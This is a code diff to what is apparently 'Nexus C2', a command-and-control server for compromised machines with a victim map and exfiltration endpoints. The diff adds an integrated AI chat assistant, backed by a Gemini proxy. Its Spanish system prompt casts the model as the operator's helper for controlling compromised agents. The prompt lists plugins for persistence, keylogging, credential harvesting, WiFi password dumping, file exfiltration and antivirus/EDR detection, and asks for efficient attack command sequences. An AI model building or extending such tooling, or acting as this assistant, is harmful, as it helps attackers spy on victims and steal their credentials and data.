@@ -190,6 +190,24 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
 .tab-btn{background:transparent;border:none;border-bottom:3px solid transparent;color:#8888b8;font-family:inherit;font-size:.75em;letter-spacing:1px;text-transform:uppercase;padding:0 20px;height:38px;cursor:pointer;transition:all .15s;white-space:nowrap}
 .tab-btn:hover{color:#00cc33;background:#0a110a}
 .tab-btn.active{color:#00ff41;border-bottom-color:#00ff41;background:#060e06;font-weight:700}
+/* ── NexusAI ──────────────────────────────────────────────────────────── */
+#pane-ai{display:none;flex-direction:column;flex:1;min-height:0;background:#06060d}
+#ai-msgs{flex:1;overflow-y:auto;padding:10px 14px;display:flex;flex-direction:column;gap:8px}
+#ai-msgs::-webkit-scrollbar{width:4px}
+#ai-msgs::-webkit-scrollbar-thumb{background:#00ff4133;border-radius:2px}
+.ai-msg{padding:8px 12px;border-radius:6px;font-size:.82em;line-height:1.55;white-space:pre-wrap;word-break:break-word;max-width:92%}
+.ai-msg.user{background:#0d1a0d;border:1px solid #00ff4133;color:#c0e0c0;align-self:flex-end}
+.ai-msg.bot{background:#0a0a18;border:1px solid #22224a;color:#c0c0e8;align-self:flex-start}
+.ai-msg.bot code{background:#12121e;color:#00ff41;padding:1px 5px;border-radius:3px;font-size:.95em}
+.ai-msg.bot pre{background:#0d0d1a;border:1px solid #22224a;border-radius:4px;padding:8px;overflow-x:auto;margin:6px 0}
+.ai-msg.bot pre code{background:none;padding:0}
+.ai-thinking{color:#4a4a7a;font-style:italic;font-size:.78em;align-self:flex-start;padding:4px 12px}
+#ai-input-row{display:flex;gap:6px;padding:8px 10px;border-top:1px solid #11113a;background:#08080f}
+#ai-input{flex:1;background:#0d0d18;border:1px solid #22224a;border-radius:4px;color:#c0c0e8;font-family:inherit;font-size:.82em;padding:7px 10px;resize:none;height:36px;outline:none;transition:border-color .15s}
+#ai-input:focus{border-color:#00ff4166}
+#ai-send{background:#00330d;border:1px solid #00ff4155;color:#00ff41;border-radius:4px;padding:0 14px;height:36px;cursor:pointer;font-family:inherit;font-size:.8em;letter-spacing:1px;transition:all .15s}
+#ai-send:hover{background:#004d14;border-color:#00ff41}
+#ai-send:disabled{opacity:.4;cursor:default}
 /* ── Victim map ───────────────────────────────────────────────────────── */
 #victim-map{background:#06060d}
 .leaflet-container{background:#06060d!important;font-family:inherit}
@@ -312,6 +330,7 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
     <div class="panel-title" style="gap:0;padding:0">
       <button class="tab-btn active" id="tab-res" onclick="switchTab('res')">Resultados</button>
       <button class="tab-btn" id="tab-map" onclick="switchTab('map')">&#127758; Equipos Vulnerados</button>
+      <button class="tab-btn" id="tab-ai" onclick="switchTab('ai')">&#129302; NexusAI</button>
       <span style="flex:1"></span>
       <span id="res-agent" style="color:#00cc33;font-size:.72em;padding:0 14px">selecciona un agente</span>
       <span id="res-count" style="color:#6666a0;font-size:.72em;padding-right:14px"></span>
@@ -319,6 +338,13 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
     <div id="pane-res" class="results-body" style="flex:1;min-height:0"><div class="empty">Selecciona un agente</div></div>
     <div id="pane-map" style="flex:1;min-height:0;display:none;position:relative">
       <div id="victim-map" style="width:100%;height:100%"></div>
+    </div>
+    <div id="pane-ai" style="flex:1;min-height:0;display:none;flex-direction:column">
+      <div id="ai-msgs"><div class="ai-msg bot">&#129302; <b>NexusAI</b> listo. Pregúntame qué comandos usar o cómo lograr un objetivo en el agente seleccionado.</div></div>
+      <div id="ai-input-row">
+        <textarea id="ai-input" placeholder="Pregunta algo... (Enter envía, Shift+Enter nueva línea)" rows="1"></textarea>
+        <button id="ai-send" onclick="aiSend()">ENVIAR</button>
+      </div>
     </div>
   </div>
 </div>
@@ -585,9 +611,12 @@ setInterval(()=>{if(sel&&!waitTask)refreshResults();},5000);
 function switchTab(name){
   document.getElementById('pane-res').style.display = name==='res'?'':'none';
   document.getElementById('pane-map').style.display = name==='map'?'':'none';
+  document.getElementById('pane-ai').style.display  = name==='ai'?'flex':'none';
   document.getElementById('tab-res').classList.toggle('active', name==='res');
   document.getElementById('tab-map').classList.toggle('active', name==='map');
+  document.getElementById('tab-ai').classList.toggle('active',  name==='ai');
   if(name==='map'){ initMap(); pollGeo(); }
+  if(name==='ai'){ document.getElementById('ai-input').focus(); }
 }
 
 // ── Victim map ────────────────────────────────────────────────────────
@@ -647,6 +676,75 @@ async function fetchGeo(){
     }
   }catch(_){}
 }
+
+// ── NexusAI ───────────────────────────────────────────────────────────
+let _aiHistory = [];
+
+function aiMarkdown(text){
+  // Renderiza bloques de código y código inline con estilos básicos
+  return text
+    .replace(/```[\\w]*[\\s\\S]*?```/g, b=>{const c=b.replace(/^```\\w*\\n?/,'').replace(/```$/,'');return '<pre><code>'+esc(c.trim())+'</code></pre>';})
+    .replace(/`([^`]+)`/g, (_,c)=>'<code>'+esc(c)+'</code>')
+    .replace(/\\*\\*(.*?)\\*\\*/g, '<b>$1</b>')
+    .replace(/\\n/g, '<br>');
+}
+
+function aiScroll(){
+  const box = document.getElementById('ai-msgs');
+  box.scrollTop = box.scrollHeight;
+}
+
+function aiAppend(role, html){
+  const box = document.getElementById('ai-msgs');
+  const div = document.createElement('div');
+  div.className = 'ai-msg ' + role;
+  div.innerHTML = html;
+  box.appendChild(div);
+  aiScroll();
+  return div;
+}
+
+async function aiSend(){
+  const inp = document.getElementById('ai-input');
+  const btn = document.getElementById('ai-send');
+  const text = inp.value.trim();
+  if(!text) return;
+  inp.value = '';
+  inp.style.height = '36px';
+  btn.disabled = true;
+
+  aiAppend('user', esc(text));
+  const thinking = aiAppend('bot', '<span class="ai-thinking">NexusAI está pensando...</span>');
+
+  try{
+    const r = await fetch('/ai', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({message: text, history: _aiHistory})
+    });
+    const data = await r.json();
+    if(data.error){
+      thinking.innerHTML = `<span style="color:#ff4444">Error: ${esc(data.error)}</span>`;
+    } else {
+      thinking.innerHTML = aiMarkdown(data.response);
+      _aiHistory.push({role:'user', content: text});
+      _aiHistory.push({role:'assistant', content: data.response});
+      if(_aiHistory.length > 20) _aiHistory = _aiHistory.slice(-20);
+    }
+  }catch(e){
+    thinking.innerHTML = `<span style="color:#ff4444">Error de conexión: ${esc(String(e))}</span>`;
+  }
+  btn.disabled = false;
+  aiScroll();
+  inp.focus();
+}
+
+// Enter envía, Shift+Enter nueva línea
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.getElementById('ai-input').addEventListener('keydown', e=>{
+    if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); aiSend(); }
+  });
+});
 </script>
 </body>
 </html>"""
@@ -667,6 +765,7 @@ MAX_RESULTS      = 500
 MAX_OUTPUT_BYTES = 64 * 1024
 OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")
 ALLOW_CLEAR      = os.environ.get("NEXUS_ALLOW_CLEAR", "0") == "1"
+GEMINI_API_KEY   = os.environ.get("GEMINI_API_KEY", "")
 DNS_PORT         = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
 DNS_DOMAIN       = b"n\x02c2\x00"  # encoded "n.c2" label sequence
 
@@ -1145,6 +1244,68 @@ async def api_geo(request: web.Request) -> web.Response:
     return web.json_response(out)
 
 
+_GEMINI_SYSTEM = """Eres NexusAI, el asistente integrado en el panel de operador de Nexus C2.
+Ayudas al operador a elegir comandos y plugins para interactuar con los agentes comprometidos.
+Responde siempre en español. Sé conciso y directo. Usa bloques de código para los comandos.
+
+Plugins disponibles:
+- !sysinfo — información completa del sistema (OS, usuario, UID, red, PID)
+- !screenshot — captura de pantalla silenciosa multiplataforma
+- !download <url> <dst> — descarga un archivo hacia el agente
+- !persist — instala el agente en crontab para persistencia
+- !cat <ruta> — lee un archivo o lista un directorio
+- !clip read — lee el portapapeles
+- !clip write <texto> — escribe en el portapapeles
+- !exfil <ruta> — sube un archivo del agente al servidor C2
+- !keylog start/dump/stop — captura de teclado en background
+- !mimikatz — recolección de credenciales Linux
+- !nmcli status/wifi/saved/passwords/ifaces — reconocimiento de red WiFi
+- !unhook — detecta antivirus, EDR y debuggers activos
+- !help — lista todos los plugins
+
+También puedes usar comandos shell arbitrarios (ls, ps aux, cat /etc/passwd, etc.).
+Cuando el operador describa un objetivo, sugiere la secuencia de comandos más eficiente."""
+
+
+async def api_gemini_proxy(request: web.Request) -> web.Response:
+    """POST /ai — proxy seguro a Gemini 2.0 Flash. La API key nunca llega al frontend."""
+    if not GEMINI_API_KEY:
+        return web.json_response({"error": "GEMINI_API_KEY no configurada en el servidor"}, status=503)
+    try:
+        body    = await request.json()
+        message = str(body.get("message", "")).strip()
+        history = body.get("history", [])
+        if not message:
+            return web.json_response({"error": "mensaje vacío"}, status=400)
+    except Exception:
+        return web.json_response({"error": "body JSON inválido"}, status=400)
+
+    # Construir contents: historial (máx 10 msgs) + mensaje actual
+    contents = []
+    for h in history[-10:]:
+        role = "model" if h.get("role") in ("assistant", "model") else "user"
+        contents.append({"role": role, "parts": [{"text": str(h.get("content", ""))}]})
+    contents.append({"role": "user", "parts": [{"text": message}]})
+
+    payload = {
+        "system_instruction": {"parts": [{"text": _GEMINI_SYSTEM}]},
+        "contents": contents,
+        "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.7},
+    }
+    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as r:
+                data = await r.json()
+        if r.status != 200:
+            return web.json_response({"error": data.get("error", {}).get("message", "Gemini error")}, status=502)
+        text = data["candidates"][0]["content"]["parts"][0]["text"]
+        return web.json_response({"response": text})
+    except Exception as exc:
+        log.error("Gemini proxy error: %s", exc)
+        return web.json_response({"error": "Error al contactar Gemini"}, status=502)
+
+
 async def handle_panel(request: web.Request) -> web.Response:
     return web.Response(text=_PANEL_HTML, content_type="text/html")
 
@@ -1425,5 +1586,6 @@ def build_app() -> web.Application:
     app.router.add_post("/exfil",                    api_exfil_receive)
     app.router.add_get("/exfil",                     api_exfil_list)
     app.router.add_get("/geo",                       api_geo)
+    app.router.add_post("/ai",                       api_gemini_proxy)
     app.on_startup.append(_on_startup)
     return app
